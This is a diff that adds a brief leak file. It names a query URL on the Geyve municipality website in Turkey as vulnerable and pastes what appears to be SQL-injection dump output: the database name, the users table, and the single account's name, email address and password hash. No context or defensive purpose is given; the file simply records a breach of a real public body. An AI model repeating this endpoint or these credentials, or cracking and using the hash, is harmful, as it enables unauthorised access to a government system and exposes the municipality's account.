@@ -1,0 +1,10 @@
+VULN URL : https://app.geyve.bel.tr/ilce_detay.php?id=32
+
+Database: appgeyve_vt
+Table: kullanicilar
+[1 entry]
++--------------+------------------+-------------------+-----------------------------------+
+| kullanici_id | kullanici_isim   | kullanici_mail    | kullanici_sifre                   |
++--------------+------------------+-------------------+-----------------------------------+
+| 1            | Geyve Belediyesi | info@geyve.bel.tr | 827ccb0eea8a706c4c34a16891f84e7b  |
++--------------+------------------+-------------------+-----------------------------------+
